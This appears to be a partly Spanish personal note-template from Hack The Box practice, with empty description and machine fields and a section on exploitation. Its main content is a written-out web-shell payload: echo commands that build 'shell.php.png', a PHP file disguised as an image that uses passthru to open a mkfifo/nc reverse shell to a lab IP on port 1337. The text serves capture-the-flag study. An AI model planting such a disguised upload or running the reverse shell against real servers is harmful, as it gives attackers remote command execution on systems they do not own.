
## DESCRIPTION



#### Mas información
* 


## EXPLOITATION

### OPTION 1: REVERSE SHELL USING NC

```
echo '<?php' >> shell.php.png
echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f");' >> shell.php.png
echo '?>' >> shell.php.png
```

![[Pasted image 20230421174647.png]]



## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 